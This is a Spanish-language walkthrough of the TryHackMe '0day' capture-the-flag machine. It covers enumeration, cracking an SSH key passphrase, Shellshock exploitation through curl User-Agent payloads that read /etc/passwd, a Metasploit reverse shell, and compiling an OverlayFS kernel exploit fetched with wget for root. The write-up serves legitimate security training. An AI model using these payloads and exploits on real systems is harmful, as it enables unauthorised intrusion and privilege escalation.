# TryHackMe - 0day 🧨

## Introducción 📝

0day es una máquina Linux de dificultad *medium* en TryHackMe, creada por Ryan Montgomery, el hacker ético número 1 de la plataforma. Esta máquina nos lleva de vuelta a la historia para explorar la infame vulnerabilidad **Shellshock**, por lo que es ideal para practicantes de hacking ético de nivel principiante e intermedio.

---

## 1️⃣ Comprobando conectividad con `ping` 🧪

Antes de empezar con el reconocimiento más profundo, siempre verifico que la máquina objetivo responde en la red.

````bash
ping -c 4 10.80.174.235
````
- `-c 4` limita el envío a **4 paquetes ICMP**.  
- Todas las respuestas vuelven correctamente, con **0% packet loss**, lo que confirma que la máquina está accesible y lista para seguir con el análisis.

<img width="695" height="297" alt="ping" src="https://github.com/user-attachments/assets/7790e0c3-6c5a-49ee-824c-1a7559e0f673" />

---

## 2️⃣ Escaneo de puertos con `nmap` 🔎

El siguiente paso es identificar qué puertos y servicios están expuestos en la máquina objetivo. Para ello lanzo un escaneo con `nmap`:
````bash
nmap -sS -sV -p- --min-rate 5000 -vvv -n -Pn -oN escaneoNmap 10.80.174.235
````

- `-sS`: escaneo SYN (rápido y sigiloso).  
- `-sV`: detección de versión de servicios.  
- `-p-`: escanea **todos** los puertos TCP (1-65535).  
- `--min-rate 5000`: fuerza al menos 5000 paquetes por segundo para acelerar el escaneo.  
- `-n`: no resolver DNS (más rápido).  
- `-Pn`: omite la detección de host (asumimos que está vivo).  
- `-oN escaneoNmap`: guarda el resultado en un archivo.

Del escaneo destacan:
- Puerto **22/tcp** abierto: servicio **SSH** (OpenSSH 6.6.1p1 sobre Ubuntu).  
- Puerto **80/tcp** abierto: servicio **HTTP** (Apache httpd 2.4.7 sobre Ubuntu, hostname `0day`).

 <img width="1858" height="669" alt="Nmap" src="https://github.com/user-attachments/assets/4eec0628-6fc3-490c-9cb6-86869540e107" />
 
---

## 3️⃣ Enumeración del servicio HTTP (puerto 80) 🌐

Con el puerto 80 abierto, el siguiente paso es revisar la web en el navegador:

- Accedo a `http://10.80.174.235` y se carga una landing con el título **0day** y datos de Ryan Montgomery (links a redes sociales).  
- A primera vista es una página estática, sin formularios ni secciones que llamen especialmente la atención.

<img width="1356" height="863" alt="pagina p80" src="https://github.com/user-attachments/assets/0dcd0cf1-c3b5-4d6a-b64f-122ad59b24b1" />

A continuación reviso el **código fuente** de la página (`Ctrl+U`):

- Principalmente contiene enlaces a hojas de estilo y scripts (Bootstrap, jQuery, etc.).  
- No aparecen comentarios, rutas ocultas ni parámetros sospechosos.

<img width="1597" height="723" alt="codigo fuente pagina" src="https://github.com/user-attachments/assets/9d96f0ec-104d-4e08-af5c-b83b732e64dd" />

---

## 4️⃣ Enumeración de directorios y detección de Shellshock 🐚

Para ir más allá de la página principal, lanzo un **fuzzing de directorios** con `gobuster`:
````bash
gobuster dir -u http://10.80.174.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
````
Este escaneo revela varios directorios interesantes:

- `/cgi-bin/`
- `/admin/`
- `/backup/`
- `/secret/`
- `/uploads/`
- `/server-status` (403)

<img width="856" height="513" alt="gobsuter" src="https://github.com/user-attachments/assets/ba2056a7-7575-4e42-9d6c-e381a2be7845" />

---

A continuación, analizo el servidor con **Nikto**:
````bash
nikto -h "http://10.80.174.235" | tee nikto.log
````
Entre los resultados aparece:

- Fichero `/cgi-bin/test.cgi`
- Nikto indica explícitamente que `cgi-bin/test.cgi` **parece vulnerable a Shellshock** (CVE-2014-6271).

<img width="943" height="708" alt="nikto" src="https://github.com/user-attachments/assets/defe8bd4-4c36-4519-8070-f5f56e30388b" />

> En este punto ya sabemos que el objetivo será **explotar Shellshock sobre `/cgi-bin/test.cgi`** para obtener ejecución remota de comandos.
> 
---

## 5️⃣ Acceso SSH mediante clave RSA (y obtención de la contraseña) 🔐

Durante la enumeración web, accedo a:

`view-source:http://10.80.174.235/backup/`

y encuentro una **clave privada RSA** dentro del directorio `/backup/`.

<img width="842" height="639" alt="directorio backup" src="https://github.com/user-attachments/assets/bcb32296-2ca8-4be3-a82f-bc097ee7fea3" />

Guardo la clave en un archivo local y ajusto permisos:
````bash
nano id_rsa # pego la clave
chmod 600 id_rsa
````
Intento conectarme por SSH con la clave:
````bash
ssh -i id_rsa ryan@10.80.174.235
````

La clave es válida, pero:

- Se solicita una **passphrase** para la clave.
- Al no conocerla, SSH termina pidiendo la **contraseña de `ryan`**, que todavía no tenemos.

<img width="830" height="219" alt="me copio la clave rsa y pruebo ssh pero necesito descifrarla" src="https://github.com/user-attachments/assets/687078f7-3ca1-4185-8a11-ebb1ec661e02" />

Para recuperar la **passphrase** de la clave RSA utilizo `john`:
````bash
ssh2john id_rsa > forjohn.txt
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
````

Cuando `john` termina, muestra la passphrase en texto claro, que podré usar después:

- Para desbloquear la clave `id_rsa`.
- O bien como posible contraseña del usuario `ryan`.

<img width="875" height="265" alt="descifro clave rsa" src="https://github.com/user-attachments/assets/a9d81db5-bc11-4814-9bca-0fc492701308" />

Pruebo la passphrase funcionando correctamente pero ahora me pide un password que no tenemos.

<img width="564" height="150" alt="me falta el password de ryan la clave rsa funciona" src="https://github.com/user-attachments/assets/547ea27b-75b8-4511-b6c1-e678a8bcb9ff" />

---

## 6️⃣ Investigación de la vulnerabilidad Shellshock 📚🐚

Sabiendo que el servidor parece vulnerable a **Shellshock (CVE-2014-6271)**, antes de explotarla busco información para entender mejor el fallo.

1. Reviso la entrada de **Wikipedia** sobre Shellshock:
   - Se describe como una vulnerabilidad en **Bash** que permite ejecutar comandos arbitrarios mediante variables de entorno manipuladas.
   - Se explican los vectores de ataque, como los **servidores web CGI**.

<img width="1016" height="752" alt="información de la vulnerabilidad" src="https://github.com/user-attachments/assets/de960fa7-3058-41ae-8cc7-71da26a93a9a" />

2. Consulto el **CVE oficial CVE-2014-6271**:
   - Confirma que versiones de GNU Bash hasta 4.3 permiten la ejecución remota de comandos a través de variables de entorno especialmente construidas.
   - Se menciona explícitamente el alias “ShellShock”.

<img width="970" height="467" alt="vulnerabilidad en apache" src="https://github.com/user-attachments/assets/fb33b93f-3654-4603-bd40-76d598090153" />

3. Busco ejemplos de **exploit**:
   - Encuentro un repositorio en GitHub con un *one-liner* usando `curl` para enviar la carga maliciosa en la cabecera `User-Agent` contra un script en `/cgi-bin/`.

<img width="662" height="500" alt="otro repositorio ok" src="https://github.com/user-attachments/assets/bad22bfc-a26d-4bca-8507-1d265f77f576" />

> Esta fase teórica es clave para comprender **por qué** funciona el exploit y cómo adaptarlo a nuestro objetivo concreto (`/cgi-bin/test.cgi`).

---

## 7️⃣ Explotando Shellshock con `curl` 🐚⚙️

Una vez identificada la vulnerabilidad en `/cgi-bin/test.cgi`, pruebo primero el script:
````bash
curl "http://10.80.174.235/cgi-bin/test.cgi"
````

La respuesta es:
````bash
Hello World!
````
<img width="876" height="144" alt="funciona el exploit" src="https://github.com/user-attachments/assets/59547f98-13cc-4a3e-a804-b05801d12777" />

Ahora lanzo el exploit de **Shellshock** inyectando código en la cabecera `User-Agent`:
````bash
curl -H "User-Agent:() { :; }; echo; echo; /bin/bash -c 'id'"
"http://10.80.174.235/cgi-bin/test.cgi"
````
La salida devuelve:
````bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
````

Confirmada la ejecución remota de comandos (RCE), pruebo otro comando para ver el contenido de `/etc/passwd`:

````bash
curl -H "User-Agent:() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
"http://10.80.174.235/cgi-bin/test.cgi"
````
<img width="877" height="502" alt="probamos otro comando cat" src="https://github.com/user-attachments/assets/5cbe399c-600d-4674-981f-66fed9da25ab" />

> Ya tenemos **RCE como `www-data`** a través de Shellshock. El siguiente objetivo será convertir esta ejecución de comandos en una **reverse shell interactiva**.

---

## 8️⃣ Explotando Shellshock con Metasploit (reverse shell) 🎯

Aunque ya comprobamos la RCE con `curl`, también pruebo la explotación usando **Metasploit**.

1. Buscando el módulo adecuado

En la consola de `msfconsole` ejecuto:
````bash
search shellshock
````

Selecciono el módulo:
````bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
````

<img width="930" height="912" alt="metasploit" src="https://github.com/user-attachments/assets/39d5d7f7-4278-4516-83c3-4fdce2d4fc23" />

2. Configurando el exploit

Configuro las opciones necesarias:
````bash
set LHOST tun0
set RHOSTS 10.80.174.235
set TARGETURI /cgi-bin/test.cgi
`````

Lanzo el exploit:
````bash
run
````
Metasploit sube el payload y abre una sesión `meterpreter`:

- Se inicia el handler en `192.168.140.51:4444`.
- Se abre la sesión 1 desde la máquina víctima.

3. De Meterpreter a shell interactiva

Dentro de `meterpreter`:
````bash
getuid # confirma que somos www-data
shell # abre una shell en la máquina víctima
bash -i # convierte la shell en interactiva
````

La shell queda como:
````bash
www-data@ubuntu:/usr/lib/cgi-bin$
````
> Ahora disponemos de una **reverse shell estable como `www-data`**, lista para continuar con la enumeración interna y la escalada de privilegios.

<img width="960" height="530" alt="seteamos opciones y obtemos el shell" src="https://github.com/user-attachments/assets/77725704-10d8-4fa4-a64e-22a9904209cb" />

---

## 9️⃣ Enumeración en `/home` y obtención de `user.txt` 🧑‍💻

Ya con shell como `www-data`, empiezo a enumerar los usuarios del sistema:
````bash
cd /home
ls -la
````
Veo:

- Directorio `ryan/`
- Un enlace simbólico `.secret -> /root/root.txt` (flag de root a la que aún no tenemos acceso).

<img width="795" height="282" alt="lsito arhicvos ocultos no puedo leer secret" src="https://github.com/user-attachments/assets/7d0664b3-9d9b-43e9-ac16-af3a12592dee" />

Como `www-data` no puede leer el `.secret`, entro al directorio de `ryan`:
````bash
cd ryan
ls -la
cat user.txt
````
El archivo `user.txt` contiene la **flag de usuario**.

<img width="821" height="342" alt="entro a la carpeta ryan y obtengo flag user" src="https://github.com/user-attachments/assets/110b19ea-c98e-4b49-aa45-0cd349ced203" />

> Con esto conseguimos la **user flag**, pero aún necesitamos escalar privilegios para leer la flag de root apuntada por `.secret`.

---

## 🔟 Enumeración del kernel y elección de exploit (OverlayFS) 🧗‍♂️

Para escalar privilegios, primero reviso la versión del kernel desde la shell de `www-data`:
````bash
cd /tmp
uname -a
````

La salida muestra:

- `Linux ubuntu 3.13.0-32-generic ...`

<img width="961" height="142" alt="buscamos verision de Ubuntu" src="https://github.com/user-attachments/assets/656d072f-c7f3-4df4-b59b-c1e1eb5e7bf9" />

Con esta versión en mente, en mi máquina atacante utilizo `searchsploit` para buscar exploits locales:
````bash
searchsploit 3.13.0
searchsploit -x linux/local/37292.c
````

`searchsploit` muestra un exploit de **Local Privilege Escalation** para:

- `Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs'`

<img width="877" height="354" alt="buscamos con searchploit" src="https://github.com/user-attachments/assets/c0c541c5-32e7-44f3-b95b-bb7ecf287aa4" />

> Con esto identifico que el vector de escalada será el exploit de **OverlayFS (CVE-2015-1328)**, que compilaremos y ejecutaremos desde `/tmp`.

---

## 1️⃣1️⃣ Transferencia del exploit, compilación y escalada a root 🧨👑

Con el exploit `37292.c` identificado, lo copio desde `searchsploit` a mi máquina atacante:
````bash
searchsploit -m linux/local/37292.c
ls
````

Ahora sirvo el archivo con un servidor HTTP simple:
````bash
sudo python3 -m http.server 8000
````
En la máquina víctima (`www-data`):
````bash
cd /tmp
wget http://10.80.174.51:8000/37292.c
ls
gcc 37292.c -o executable
./executable
id
cat /root/root.txt
````

El exploit compila y, al ejecutarlo, eleva el usuario a **root**:

- `uid=0(root) gid=0(root) groups=0(root),33(www-data)`
- Puedo leer `/root/root.txt` y obtener la **flag de root** 🏁

<img width="846" height="747" alt="me descargo el codigo en la maquina victima, y obtengo flag root escalando priv" src="https://github.com/user-attachments/assets/a38aac14-e0cd-4d10-905a-7b8d979d796f" />

---




































